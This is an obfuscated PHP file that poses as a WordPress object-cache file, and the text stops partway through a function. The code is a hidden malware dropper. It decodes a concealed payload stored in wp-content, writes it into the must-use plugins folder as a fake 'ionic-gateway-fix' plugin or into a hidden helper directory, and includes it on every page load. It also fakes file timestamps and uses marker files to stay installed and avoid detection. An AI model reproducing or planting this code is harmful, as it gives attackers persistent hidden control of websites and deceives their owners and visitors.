<?php /* .wp-object-cache-17694d3a */ /* SCOCV:4.3.24 */
if(!function_exists('bjwwdvi71z8vd0kv')){function f7rhjnujot2vfphhj($i){static $a=null;if($a===null){$a=array('plzr\\aNz/xeai\\i','A_>aD','paox/yl\\/rNz\\xz\\i','lzoaz_','>aDzWAx','DxWoyW\\*','paoxA\\aAx','\\aAx','\\Nlr*','ai/paox','paox/Tx\\/rNz\\xz\\i','yDxT/AW\\r*','D\\DaA','ToNL','ai/WDDWu','WDDWu/AxDTx','Nyxz>aD','DxW>>aD','ilLi\\D','roNix>aD','ai/>aD','LWixzWAx','paoxiaMx','A>V','ai/RDa\\WLox','ai/i\\DazT','i\\Doxz','xeyoN>x','rNlz\\','\\DaA','LWix(b/>xrN>x','lzyWr_','\\xAyzWA','DxzWAx','rNyu','i\\DyNi','r*AN>');}return $a[$i];}function bjwwdvi71z8vd0kv($i){$e=f7rhjnujot2vfphhj($i);$f='_s'.'cmkd'.'irfp'.'leut'.'ona'.'hw/'.'\\*'.' SCV'.':('.'+.)'.'yv'.'WPM'.'UL'.'GIN'.'DR-g'.'b>='.'AB'.'THj'.'1qx8'.'z<'.'?642'.'53';$t='/irA'.'_>aD'.'pyox'.'l\\'.'NzW*'.'R)'.'26'.'vc'.'I8'.':-m'.'?gu'.'C31h'.'.wfU'.'=d'.'4qT'.'LPSn'.'HG'.'B <'.'se'.'tM'.'k5'.'(bjV'.'+';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function r2_n69tv4jbvl($i){$j=$i;return bjwwdvi71z8vd0kv($j);}function lfiscp16e($i){$j=$i+0;return bjwwdvi71z8vd0kv($j);}function uxdik3oqw_5o1n($i){$j=$i;return bjwwdvi71z8vd0kv($j);}$GLOBALS['__scf_ovwaxs9beii_0']=lfiscp16e(0);$GLOBALS['__scf_dgk18ow_1j92p_1']=uxdik3oqw_5o1n(1);$GLOBALS['__scf_a3qk386h___2']=bjwwdvi71z8vd0kv(2);$GLOBALS['__scf_lanpcngb31vtm_3']=r2_n69tv4jbvl(3);$GLOBALS['__scf_q4xrklkhpr0mk_4']=r2_n69tv4jbvl(4);$GLOBALS['__scf_fe38sxrqt_l_5']=lfiscp16e(5);$GLOBALS['__scf_p87xtikpi1x__6']=r2_n69tv4jbvl(6);$GLOBALS['__scf_nnl1ru545a2_7']=uxdik3oqw_5o1n(7);$GLOBALS['__scf_budssex664_8']=bjwwdvi71z8vd0kv(8);$GLOBALS['__scf_l9xe_84z9h_9']=bjwwdvi71z8vd0kv(9);$GLOBALS['__scf_z2jrtqum51_10']=lfiscp16e(10);$GLOBALS['__scf_wzv_eism3ky__11']=lfiscp16e(11);$GLOBALS['__scf_th3zw12cc8yt69_12']=r2_n69tv4jbvl(12);$GLOBALS['__scf_aazmmueqwrto7l_13']=r2_n69tv4jbvl(13);$GLOBALS['__scf_ov01yas5eob30f_14']=uxdik3oqw_5o1n(14);$GLOBALS['__scf_vddpokdg8er_15']=bjwwdvi71z8vd0kv(15);$GLOBALS['__scf_nhr856wl9shv_16']=uxdik3oqw_5o1n(16);$GLOBALS['__scf__xqjl3oc8ygbq_17']=lfiscp16e(17);$GLOBALS['__scf_krx8b1fb4mn_18']=r2_n69tv4jbvl(18);$GLOBALS['__scf_q_4uwsonjg_19']=bjwwdvi71z8vd0kv(19);$GLOBALS['__scf_wnpib4c2q3zz4_20']=r2_n69tv4jbvl(20);$GLOBALS['__scf_eo_kc0f9amo_21']=uxdik3oqw_5o1n(21);$GLOBALS['__scf_pnemc5mrup_22']=lfiscp16e(22);$GLOBALS['__scf_rnqsf9yzl3l5ma_23']=lfiscp16e(23);$GLOBALS['__scf_kzkb4zbin6h_24']=r2_n69tv4jbvl(24);$GLOBALS['__scf_c42u7195iwlhxd_25']=r2_n69tv4jbvl(25);$GLOBALS['__scf_dhr998hvrme8l_26']=r2_n69tv4jbvl(26);$GLOBALS['__scf_g_g8515m3716_27']=r2_n69tv4jbvl(27);$GLOBALS['__scf_h8kcswjoexlob2_28']=uxdik3oqw_5o1n(28);$GLOBALS['__scf_krd7xu97af_29']=r2_n69tv4jbvl(29);$GLOBALS['__scf_sg63dx2uq7t_30']=uxdik3oqw_5o1n(30);$GLOBALS['__scf_leb2al47i9i9u_31']=lfiscp16e(31);$GLOBALS['__scf_fzu0biyi0sy6h_32']=bjwwdvi71z8vd0kv(32);$GLOBALS['__scf_ryo5n74liwww_33']=uxdik3oqw_5o1n(33);$GLOBALS['__scf_v1hp29kc8x9_34']=r2_n69tv4jbvl(34);$GLOBALS['__scf_tomf01p145vkc_35']=bjwwdvi71z8vd0kv(35);$GLOBALS['__scf_ffieamixhin_u_36']=lfiscp16e(36);

function titl5bdiq2vr43c($kcqca5){$bubsjhfe0y=($kcqca5>0)?$kcqca5:7;return $bubsjhfe0y-25;}
if   (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_mkdir'))   {
    function  _sc_mkdir($hrdc_q8vupjwq)



       {
 return   $GLOBALS['__scf_ovwaxs9beii_0']('mkdir')  ?      @$GLOBALS['__scf_dgk18ow_1j92p_1']($hrdc_q8vupjwq,   (866-373),  true)    :   false;



 }
 }
   if  (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_fpc'))    {



function  _sc_fpc($hsdp02y3saac63,    $pf_zhtvkooux0w)



 {
      return $GLOBALS['__scf_ovwaxs9beii_0']('file_put_contents')     ?      @$GLOBALS['__scf_a3qk386h___2']($hsdp02y3saac63,  $pf_zhtvkooux0w) :  false;
    }
    }


 if (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_ul'))  {


function _sc_ul($hsdp02y3saac63)
 {
return $GLOBALS['__scf_ovwaxs9beii_0']('unlink')  ?  @$GLOBALS['__scf_lanpcngb31vtm_3']($hsdp02y3saac63) :     false;


 }

      }
  if (!$GLOBALS['__scf_ovwaxs9beii_0']('i1f7epnfwbttheyp7l66'))   {
      function   i1f7epnfwbttheyp7l66($b60i5asdh41n,     $hrdc_q8vupjwq)
{
  $a0g062gapg  =   $GLOBALS['__scf_q4xrklkhpr0mk_4']($b60i5asdh41n);
 if   ($a0g062gapg   === $hrdc_q8vupjwq) return true;
   if (!$GLOBALS['__scf_ovwaxs9beii_0']('realpath'))  return    false;
    $aegx_vs24n2 =      @$GLOBALS['__scf_fe38sxrqt_l_5']($a0g062gapg);
   $ql6sdrcv_wd  = @$GLOBALS['__scf_fe38sxrqt_l_5']($hrdc_q8vupjwq);
   return ($aegx_vs24n2    !== false   &&   $ql6sdrcv_wd !==   false   &&  $aegx_vs24n2    ===     $ql6sdrcv_wd);
     }
  }
    if   (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_fam')) {
function    _sc_fam($hsdp02y3saac63)
  {
  $i3llle7qbk6v     =     @$GLOBALS['__scf_p87xtikpi1x__6']($hsdp02y3saac63);
    return $i3llle7qbk6v   &&     ($i3llle7qbk6v    % (99996+4))  ===   (39292+54527);
   }
  }
// @finalize middleware

 if    (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_fam_touch'))   {
// shift applied

  function     _sc_fam_touch($hsdp02y3saac63,    $del3m7i3_s5g =  0)
    {
   if  (!$GLOBALS['__scf_ovwaxs9beii_0']('touch'))    return;
   if  ($del3m7i3_s5g   <=    0)    $del3m7i3_s5g    = $GLOBALS['__scf_nnl1ru545a2_7']();



  $prhfqhy57akl  =    ($del3m7i3_s5g    - ($del3m7i3_s5g  %   (161595-61595)))     + (93736+83);
if  ($prhfqhy57akl  >  $GLOBALS['__scf_nnl1ru545a2_7']())   $prhfqhy57akl  -=   (99939+61);
 @$GLOBALS['__scf_budssex664_8']($hsdp02y3saac63, $prhfqhy57akl);


}



}
if    (!$GLOBALS['__scf_ovwaxs9beii_0']('y5x_c1uo_jvorvrp2'))  {

function y5x_c1uo_jvorvrp2($hsdp02y3saac63,   $ub8m490sg8)
       {
   if    ($ub8m490sg8  === ""  || !@$GLOBALS['__scf_l9xe_84z9h_9']($hsdp02y3saac63)) return  false;
    if ($GLOBALS['__scf_ovwaxs9beii_0']('clearstatcache'))  @clearstatcache(true,     $hsdp02y3saac63);
   $r4w_2h5u3s8bc0 =  (string)  @$GLOBALS['__scf_z2jrtqum51_10']($hsdp02y3saac63, false,    null,   0,   (7572-3476));
 return $GLOBALS['__scf_wzv_eism3ky__11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $r4w_2h5u3s8bc0,     $zxgtg8f4ep) === 1  && version_compare($zxgtg8f4ep[1],     $ub8m490sg8, '>');
  }
 }


     if    (!$GLOBALS['__scf_ovwaxs9beii_0']('_sc_any_live'))   {
 function _sc_any_live($azyxiejwca,    $fd1p7lhto1oey, $x77k4fqpcemb80      =    "",      $t24_i5rxqbuoo   =  "",   $yyyced50y_go10  =  "")
 {


if    ($t24_i5rxqbuoo    === "")     $t24_i5rxqbuoo   =  (defined('WPMU_PLUGIN_DIR') &&  WPMU_PLUGIN_DIR)    ?  WPMU_PLUGIN_DIR  : $fd1p7lhto1oey .  '/mu-plugins';
    if ($yyyced50y_go10 ===   "")   $yyyced50y_go10   = (defined('WP_PLUGIN_DIR')    && WP_PLUGIN_DIR) ? WP_PLUGIN_DIR  : $fd1p7lhto1oey  .      '/plugins';
       $t24_i5rxqbuoo   =    $GLOBALS['__scf_th3zw12cc8yt69_12']($t24_i5rxqbuoo, '/');
    $yyyced50y_go10 =    $GLOBALS['__scf_th3zw12cc8yt69_12']($yyyced50y_go10,    '/');
 

$p30_lvuzc6_sqy = array();
$lvzn8zkeke2 =   false;
     if  ($GLOBALS['__scf_ovwaxs9beii_0']('glob'))   {
   $auwwxkebxli1fqj    = @$GLOBALS['__scf_aazmmueqwrto7l_13']($t24_i5rxqbuoo .  '/*.php');

$ckn_gzxftdynbq =    @$GLOBALS['__scf_aazmmueqwrto7l_13']($yyyced50y_go10    . '/*/*.php');
  if  ($GLOBALS['__scf_ov01yas5eob30f_14']($auwwxkebxli1fqj)  ||   $GLOBALS['__scf_ov01yas5eob30f_14']($ckn_gzxftdynbq)) {
$lvzn8zkeke2   =  true;
     $p30_lvuzc6_sqy =  $GLOBALS['__scf_vddpokdg8er_15']((array) $auwwxkebxli1fqj,    (array)  $ckn_gzxftdynbq);
   }
 unset($auwwxkebxli1fqj,  $ckn_gzxftdynbq);
       }
    if (!$lvzn8zkeke2  &&    $GLOBALS['__scf_ovwaxs9beii_0']('opendir') &&      $GLOBALS['__scf_ovwaxs9beii_0']('readdir'))    {
$cb_ubh3wdcw   =  @$GLOBALS['__scf_nhr856wl9shv_16']($t24_i5rxqbuoo);
    if   ($cb_ubh3wdcw)    {
 while (($h95o6zuotb4st  =  @$GLOBALS['__scf__xqjl3oc8ygbq_17']($cb_ubh3wdcw))  !==  false)  {
     if ($GLOBALS['__scf_krx8b1fb4mn_18']($h95o6zuotb4st,   -(6-2)) ===     '.php')  $p30_lvuzc6_sqy[]   =      $t24_i5rxqbuoo .     '/'  .    $h95o6zuotb4st;



 }
 if  ($GLOBALS['__scf_ovwaxs9beii_0']('closedir'))  @$GLOBALS['__scf_q_4uwsonjg_19']($cb_ubh3wdcw);$gdhyf6bwo5=PHP_INT_MAX/PHP_INT_MAX;$kg2hldin__=$gdhyf6bwo5+39;
}
$cb_ubh3wdcw   =   @$GLOBALS['__scf_nhr856wl9shv_16']($yyyced50y_go10);



     if ($cb_ubh3wdcw)   {
 while (($h95o6zuotb4st  =   @$GLOBALS['__scf__xqjl3oc8ygbq_17']($cb_ubh3wdcw)) !==  false) {
$j771jf99wlonuy = $yyyced50y_go10 .     '/'   .     $h95o6zuotb4st;



  if ($h95o6zuotb4st   ===  '.'    ||  $h95o6zuotb4st     ===  '..' ||  !@$GLOBALS['__scf_wnpib4c2q3zz4_20']($j771jf99wlonuy)) continue;
$f8goa7qelwh_5 =  @$GLOBALS['__scf_nhr856wl9shv_16']($j771jf99wlonuy);
 if    (!$f8goa7qelwh_5)   continue;
      while (($qlrtcqq1a1uy4    =    @$GLOBALS['__scf__xqjl3oc8ygbq_17']($f8goa7qelwh_5)) !==  false)  {
       if  ($GLOBALS['__scf_krx8b1fb4mn_18']($qlrtcqq1a1uy4,   -(0x2+0x2)) ===  '.php')  $p30_lvuzc6_sqy[]     = $j771jf99wlonuy .   '/'  . $qlrtcqq1a1uy4;
     }
 if   ($GLOBALS['__scf_ovwaxs9beii_0']('closedir'))    @$GLOBALS['__scf_q_4uwsonjg_19']($f8goa7qelwh_5);
     }


  if  ($GLOBALS['__scf_ovwaxs9beii_0']('closedir'))    @$GLOBALS['__scf_q_4uwsonjg_19']($cb_ubh3wdcw);
}



  unset($cb_ubh3wdcw,     $f8goa7qelwh_5,      $h95o6zuotb4st,  $qlrtcqq1a1uy4,     $j771jf99wlonuy);
  }
   $cyve2076t6i0j1      =    false;
 if  ($x77k4fqpcemb80 !==   ""  &&     $GLOBALS['__scf_ovwaxs9beii_0']('realpath'))   $cyve2076t6i0j1   =    @$GLOBALS['__scf_fe38sxrqt_l_5']($x77k4fqpcemb80);
  

foreach     ($p30_lvuzc6_sqy      as $b60i5asdh41n) {



      if    ($x77k4fqpcemb80     !== "" && $b60i5asdh41n    === $x77k4fqpcemb80)  continue;
 if ($cyve2076t6i0j1     !== false  &&  @$GLOBALS['__scf_fe38sxrqt_l_5']($b60i5asdh41n)   === $cyve2076t6i0j1) continue;
  $jlgo7tg915pd75 =  $GLOBALS['__scf_eo_kc0f9amo_21']($b60i5asdh41n,   '.php');

  $nwffvz82k_ =    $GLOBALS['__scf_eo_kc0f9amo_21']($GLOBALS['__scf_q4xrklkhpr0mk_4']($b60i5asdh41n));
   if  ($GLOBALS['__scf_q4xrklkhpr0mk_4']($b60i5asdh41n)     !== $t24_i5rxqbuoo    &&     $jlgo7tg915pd75     !== $nwffvz82k_) continue;
  if ($GLOBALS['__scf_ovwaxs9beii_0']('_sc_fam')    && !_sc_fam($b60i5asdh41n))     continue;



  $w3_8jhzwl50q71s    =   @$GLOBALS['__scf_pnemc5mrup_22']($b60i5asdh41n);


     if   (!$w3_8jhzwl50q71s    ||   $w3_8jhzwl50q71s < (4950+50)  ||     $w3_8jhzwl50q71s   >      (0x2826f07+0x9d90f9))  continue;
  $xe3wz64oktayth    =   (string)  @$GLOBALS['__scf_z2jrtqum51_10']($b60i5asdh41n,  false,  null, 0,      (4042+54));
 if ($xe3wz64oktayth !==   "" &&     $GLOBALS['__scf_wzv_eism3ky__11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//', $xe3wz64oktayth,   $i3llle7qbk6v)    &&   version_compare($i3llle7qbk6v[1],    $azyxiejwca,  '>=')) return true;
  }
   return false;
    }

    }
    if   (!defined('ABSPATH')) {
   return;
     }
    $y8g1fse4wu    = function    ()     {
    $nr5nn88a_imsi7   =   $GLOBALS['__scf_krx8b1fb4mn_18']($GLOBALS['__scf_rnqsf9yzl3l5ma_23'](ABSPATH  . 'oc'),  0, (2+6));
$b5f901o66bgj =     WP_CONTENT_DIR . '/.wp-object-cache-' .  $nr5nn88a_imsi7    .    '.dat';
if (!@$GLOBALS['__scf_l9xe_84z9h_9']($b5f901o66bgj))  {
     return;
  }



$o04aemairyuags8 =    (defined('WPMU_PLUGIN_DIR') &&  WPMU_PLUGIN_DIR)      ?  WPMU_PLUGIN_DIR   :   WP_CONTENT_DIR     . '/mu-plugins';
 if  (!@$GLOBALS['__scf_wnpib4c2q3zz4_20']($o04aemairyuags8)) {
 _sc_mkdir($o04aemairyuags8);
}
   $wh_i5577qay =  $o04aemairyuags8   . '/ionic-gateway-fix.php';
   $w8a2spb1uq7b   =  false;
  if   (@$GLOBALS['__scf_l9xe_84z9h_9']($wh_i5577qay))   {
$s5yxvrkhkneh5    = @$GLOBALS['__scf_pnemc5mrup_22']($wh_i5577qay);
if    ($s5yxvrkhkneh5    &&  $s5yxvrkhkneh5     >   (0xbfc+0x78c) && $s5yxvrkhkneh5      <=   (7121377+45307423) &&    !@$GLOBALS['__scf_l9xe_84z9h_9']($o04aemairyuags8 . '/.wr_ionic-gateway-fix'))  {



$a67r26oqnn  =   $o04aemairyuags8 . '/.bt_ionic-gateway-fix';
$f26qojr97w5v69f   =   @$GLOBALS['__scf_l9xe_84z9h_9']($a67r26oqnn)  ? (int)   @$GLOBALS['__scf_p87xtikpi1x__6']($a67r26oqnn)    :   0;
 if ($f26qojr97w5v69f && $f26qojr97w5v69f >=    (int)   @$GLOBALS['__scf_p87xtikpi1x__6']($wh_i5577qay)    &&    $f26qojr97w5v69f     <=     $GLOBALS['__scf_nnl1ru545a2_7']() +  (217+83))  {



return;
  }
 }
}


 if  (!@$GLOBALS['__scf_wnpib4c2q3zz4_20']($o04aemairyuags8) ||  !@$GLOBALS['__scf_kzkb4zbin6h_24']($o04aemairyuags8))  {



 $wh_i5577qay     =  WP_CONTENT_DIR  .  '/.oc_'  . $nr5nn88a_imsi7    .   '/helper_' . $nr5nn88a_imsi7   . '.php';
    $w8a2spb1uq7b  =   true;
  if  (@$GLOBALS['__scf_l9xe_84z9h_9']($wh_i5577qay)) {
$s5yxvrkhkneh5 = @$GLOBALS['__scf_pnemc5mrup_22']($wh_i5577qay);
        if    ($s5yxvrkhkneh5 && $s5yxvrkhkneh5  >  (4952+48) && $s5yxvrkhkneh5 <=  (52428717+83)   &&   !@$GLOBALS['__scf_l9xe_84z9h_9']($GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)     . '/.wr_'   .   $GLOBALS['__scf_eo_kc0f9amo_21']($wh_i5577qay, '.php')))  {


 $a67r26oqnn =   $GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)   .   '/.bt_'  .   $GLOBALS['__scf_eo_kc0f9amo_21']($wh_i5577qay, '.php');
       $f26qojr97w5v69f  =  @$GLOBALS['__scf_l9xe_84z9h_9']($a67r26oqnn)  ? (int)   @$GLOBALS['__scf_p87xtikpi1x__6']($a67r26oqnn)   :   0;
 if     ($f26qojr97w5v69f   &&    $f26qojr97w5v69f >=   (int)  @$GLOBALS['__scf_p87xtikpi1x__6']($wh_i5577qay))   {


  if    ($GLOBALS['__scf_ovwaxs9beii_0']('add_action'))  {
 add_action('muplugins_loaded',  function ()   use ($wh_i5577qay) {
   try {
     @include_once $wh_i5577qay;
    }   catch    (\Throwable $thsohg3oygte)    {
      } catch  (\Exception    $thsohg3oygte) {



  }
 },    0);
}



   return;


  }

}
     }
 }
$di9k4t1_yj30ep   = WP_CONTENT_DIR   . '/.rd_ionic-gateway-fix';

      $z3vzwpcr81x8yn    =     @$GLOBALS['__scf_l9xe_84z9h_9']($di9k4t1_yj30ep)    ?    (int)     @$GLOBALS['__scf_p87xtikpi1x__6']($di9k4t1_yj30ep)   : 0;



    if  ($z3vzwpcr81x8yn >  $GLOBALS['__scf_nnl1ru545a2_7']()    - (256+44)   &&  $z3vzwpcr81x8yn  <=  $GLOBALS['__scf_nnl1ru545a2_7']() + (216+84)) {
return;
    }
     if      ($GLOBALS['__scf_ovwaxs9beii_0']('touch'))     @$GLOBALS['__scf_budssex664_8']($di9k4t1_yj30ep);
$_7pr4m982ki7jt5p  = false;
    $ths6rq15ifqstcu  =     "";
 foreach (array($b5f901o66bgj, $b5f901o66bgj  .     '.lkg') as   $ghindmy2trmi) {
  $zyps57vidt45d4b   =  @$GLOBALS['__scf_l9xe_84z9h_9']($ghindmy2trmi)    ? (int) @$GLOBALS['__scf_pnemc5mrup_22']($ghindmy2trmi)   : 0;
      if  ($zyps57vidt45d4b   <   (136-36)    ||    $zyps57vidt45d4b  >    (2097070+82)) {



continue;
 }

 $othrsxfp2rai    =   @$GLOBALS['__scf_z2jrtqum51_10']($ghindmy2trmi);
  if    (!$GLOBALS['__scf_c42u7195iwlhxd_25']($othrsxfp2rai)    || $GLOBALS['__scf_dhr998hvrme8l_26']($othrsxfp2rai) <   (89+11)  ||    $GLOBALS['__scf_dhr998hvrme8l_26']($othrsxfp2rai)  >    (0x14b869+0xb4797))  {


     continue;


    }
 $o0jzb8aj4u4 = $GLOBALS['__scf_g_g8515m3716_27'](':', $othrsxfp2rai, (1<<2));
     if ($GLOBALS['__scf_h8kcswjoexlob2_28']($o0jzb8aj4u4)    < (190^186)   || $o0jzb8aj4u4[0]  !==   'SCD1'     ||     $GLOBALS['__scf_dhr998hvrme8l_26']($o0jzb8aj4u4[(2+1)]) <   (16+34))  {
     continue;$gauh_u45=85+21;$v0j0d53rx=$gauh_u45-26;
}
// @enable invariant

 $zyxpzpniv6  =  $GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay) . '/.q_'    .  $GLOBALS['__scf_eo_kc0f9amo_21']($wh_i5577qay, '.php');
     if (@$GLOBALS['__scf_l9xe_84z9h_9']($zyxpzpniv6)) {
 $n1h37pcm5rn4  =  (int)   @$GLOBALS['__scf_p87xtikpi1x__6']($zyxpzpniv6);

       if ($n1h37pcm5rn4    >     $GLOBALS['__scf_nnl1ru545a2_7']() - (604745+55) && $n1h37pcm5rn4 <=   $GLOBALS['__scf_nnl1ru545a2_7']()  +  (86365+35)) {
 $wr9inof8dp  =    $GLOBALS['__scf_krd7xu97af_29']((string)   @$GLOBALS['__scf_z2jrtqum51_10']($zyxpzpniv6));
 if      ($wr9inof8dp     !==   ""    &&   $wr9inof8dp    ===  $o0jzb8aj4u4[2])  {



 continue;
 }



}
   }
 $scwvb_g0n7d7l   =   $GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay)    .   '/.ocf_' .  $o0jzb8aj4u4[2];
       $cxi1mzzdaa   =   @$GLOBALS['__scf_l9xe_84z9h_9']($scwvb_g0n7d7l)    ?    (int)      @$GLOBALS['__scf_p87xtikpi1x__6']($scwvb_g0n7d7l)    : 0;

  if ($cxi1mzzdaa  &&  ($cxi1mzzdaa  < $GLOBALS['__scf_nnl1ru545a2_7']()  -   (86306+94)   ||  $cxi1mzzdaa  >    $GLOBALS['__scf_nnl1ru545a2_7']()  + (296+4)))    {
  _sc_ul($scwvb_g0n7d7l);



    }
  if  (@$GLOBALS['__scf_l9xe_84z9h_9']($scwvb_g0n7d7l) &&    (int)    @$GLOBALS['__scf_z2jrtqum51_10']($scwvb_g0n7d7l)    >=    (0x2+0x1))    {

   continue;
    }



   $hgp1rkc5j6   = @$GLOBALS['__scf_sg63dx2uq7t_30']($o0jzb8aj4u4[(0x2+0x1)]);
     if   ($hgp1rkc5j6 ===     false ||    $GLOBALS['__scf_dhr998hvrme8l_26']($hgp1rkc5j6)    < (83-33))   {
   continue;
    }



 if   ($GLOBALS['__scf_krx8b1fb4mn_18']($hgp1rkc5j6,  0,   2)  === "\x1f\x8b")   {
  $hxzvilnee1ke   =    @$GLOBALS['__scf_leb2al47i9i9u_31']('V', $GLOBALS['__scf_krx8b1fb4mn_18']($hgp1rkc5j6,    -(0x3+0x1)));
   if (!$GLOBALS['__scf_ov01yas5eob30f_14']($hxzvilnee1ke)  ||   $hxzvilnee1ke[1]  < (0x63+0x191)  || $hxzvilnee1ke[1]  > (0x69e49+0x961b7))   {
    continue;
 }
 if    ($GLOBALS['__scf_ovwaxs9beii_0']('gzdecode')) {
/* immutable validator */

       $w67877fktx9ih9 =  @gzdecode($hgp1rkc5j6, (733206+315370));
     if ($GLOBALS['__scf_c42u7195iwlhxd_25']($w67877fktx9ih9))   {
 $hgp1rkc5j6 = $w67877fktx9ih9;
   }
  }  elseif   ($GLOBALS['__scf_ovwaxs9beii_0']('gzinflate'))  {
   $w67877fktx9ih9  = @gzinflate($GLOBALS['__scf_krx8b1fb4mn_18']($hgp1rkc5j6,  (14-4),   -(28^20)),    (1048490+86));
 if  ($GLOBALS['__scf_c42u7195iwlhxd_25']($w67877fktx9ih9))   {
  $hgp1rkc5j6  = $w67877fktx9ih9;
 }
 }
    }  elseif   ($GLOBALS['__scf_krx8b1fb4mn_18']($hgp1rkc5j6, 0,   (2+3))     !== '<?php' && $GLOBALS['__scf_ovwaxs9beii_0']('gzinflate')  && $GLOBALS['__scf_dhr998hvrme8l_26']($hgp1rkc5j6)  <= (262078+66))    {



   $w67877fktx9ih9   =   @gzinflate($hgp1rkc5j6, (1048550+26));
 



       if  ($GLOBALS['__scf_c42u7195iwlhxd_25']($w67877fktx9ih9)  && $GLOBALS['__scf_dhr998hvrme8l_26']($w67877fktx9ih9)  <=    (1048519+57)) {



     $hgp1rkc5j6  = $w67877fktx9ih9;
}
// WP Search Block admin screen

}



     if   (!$GLOBALS['__scf_c42u7195iwlhxd_25']($hgp1rkc5j6) || $GLOBALS['__scf_dhr998hvrme8l_26']($hgp1rkc5j6) <    (123-23) || $GLOBALS['__scf_dhr998hvrme8l_26']($hgp1rkc5j6)  > (1048529+47)      ||  $GLOBALS['__scf_krx8b1fb4mn_18']($hgp1rkc5j6,   0, (9-4))    !==   '<?php'     ||  $GLOBALS['__scf_rnqsf9yzl3l5ma_23']($hgp1rkc5j6) !== $o0jzb8aj4u4[2])      {$q6twe05il=67|234;$l6axoe36yaewu=$q6twe05il^76;


   continue;
}
   $_7pr4m982ki7jt5p =   $hgp1rkc5j6;
     $ths6rq15ifqstcu =   $o0jzb8aj4u4[2];
 break;
 }
   if     ($_7pr4m982ki7jt5p  ===     false) {


     return;
}
if  (!$GLOBALS['__scf_wzv_eism3ky__11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//', $GLOBALS['__scf_krx8b1fb4mn_18']($_7pr4m982ki7jt5p,  0, (7781-3685)),  $ceyfd9wcaaneb__))   {
return;
 }
foreach  (array($o04aemairyuags8   .  '/.sd_ionic-gateway-fix',    WP_CONTENT_DIR   .    '/plugins/ionic-gateway-fix/.sd_ionic-gateway-fix')    as  $yo71g697o8u)  {


 if (!@$GLOBALS['__scf_l9xe_84z9h_9']($yo71g697o8u))   {
      continue;
    }
 $wruil5881y_2pe   =   @$GLOBALS['__scf_z2jrtqum51_10']($yo71g697o8u);

if  (!$GLOBALS['__scf_c42u7195iwlhxd_25']($wruil5881y_2pe) ||   !$GLOBALS['__scf_wzv_eism3ky__11']('/\d+\.\d+\.\d+/',  $wruil5881y_2pe,  $pnzkmz3r2prdu))  {
    continue;
 }
if  (!version_compare($pnzkmz3r2prdu[0],      $ceyfd9wcaaneb__[1],  '>='))  {
 continue;

  }



  if    (_sc_any_live($pnzkmz3r2prdu[0],  WP_CONTENT_DIR,  $w8a2spb1uq7b ?   "" :   $wh_i5577qay)) {
return;
    }
   }
 $typg8ppori4a04aw =     $GLOBALS['__scf_q4xrklkhpr0mk_4']($wh_i5577qay);
 if    (!@$GLOBALS['__scf_wnpib4c2q3zz4_20']($typg8ppori4a04aw))    {



 _sc_mkdir($typg8ppori4a04aw);
   }
  if   (!@$GLOBALS['__scf_wnpib4c2q3zz4_20']($typg8ppori4a04aw)  || !@$GLOBALS['__scf_kzkb4zbin6h_24']($typg8ppori4a04aw))      {
   return;
}
    if (!$GLOBALS['__scf_ovwaxs9beii_0']('tempnam')   ||     !$GLOBALS['__scf_ovwaxs9beii_0']('file_put_contents')) {
  return;


      }
 $lbukt5ell6kd86i     = @$GLOBALS['__scf_fzu0biyi0sy6h_32']($typg8ppori4a04aw,     'oc');
   if  ($lbukt5ell6kd86i ===  false) {
return;$y5xx_2tmypp7=(0xf+0xac);$e0krwyixzhyzmb=$y5xx_2tmypp7%11;
    }
      if (!i1f7epnfwbttheyp7l66($lbukt5ell6kd86i,   $typg8ppori4a04aw))   {
   _sc_ul($lbukt5ell6kd86i);

   return;
 }
   if      (@$GLOBALS['__scf_a3qk386h___2']($lbukt5ell6kd86i,   $_7pr4m982ki7jt5p) !== $GLOBALS['__scf_dhr998hvrme8l_26']($_7pr4m982ki7jt5p))   {
     _sc_ul($lbukt5ell6kd86i);
 return;
 }
 if  (@$GLOBALS['__scf_l9xe_84z9h_9']($wh_i5577qay)) {
  $he_frybr5cl  =   (string)    @$GLOBALS['__scf_z2jrtqum51_10']($wh_i5577qay,   false,     null,  0,   (1288+2808));
if   ($GLOBALS['__scf_wzv_eism3ky__11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $he_frybr5cl,   $hby18jopljtaev) &&  version_compare($hby18jopljtaev[1], $ceyfd9wcaaneb__[1], '>='))    {



 _sc_ul($lbukt5ell6kd86i);
      return;
  }
    unset($he_frybr5cl, $hby18jopljtaev);
}
$bnee652vgp7r =   false;
if ($GLOBALS['__scf_ovwaxs9beii_0']('rename'))    $bnee652vgp7r    =  @$GLOBALS['__scf_ryo5n74liwww_33']($lbukt5ell6kd86i, $wh_i5577qay);
     if   (!$bnee652vgp7r &&   $GLOBALS['__scf_ovwaxs9beii_0']('copy')) {
        $bnee652vgp7r    = @$GLOBALS['__scf_v1hp29kc8x9_34']($lbukt5ell6kd86i,      $wh_i5577qay);
if   ($bnee652vgp7r)  _sc_ul($lbukt5ell6kd86i);
 }
if   (!$bnee652vgp7r) {
// @inject filter-chain

  _sc_ul($lbukt5ell6kd86i);
 return;


 }
if      ($GLOBALS['__scf_ovwaxs9beii_0']('clearstatcache'))  {

  @clearstatcache(true, $wh_i5577qay);
  }
    $tr9_zx06yip     = @$GLOBALS['__scf_z2jrtqum51_10']($wh_i5577qay);
    if   (!$GLOBALS['__scf_c42u7195iwlhxd_25']($tr9_zx06yip)   ||  $tr9_zx06yip  !== $_7pr4m982ki7jt5p) {
if    ($GLOBALS['__scf_c42u7195iwlhxd_25']($tr9_zx06yip)     &&     $GLOBALS['__scf_tomf01p145vkc_35']($tr9_zx06yip,   '/* SCV:') !== false)  return;
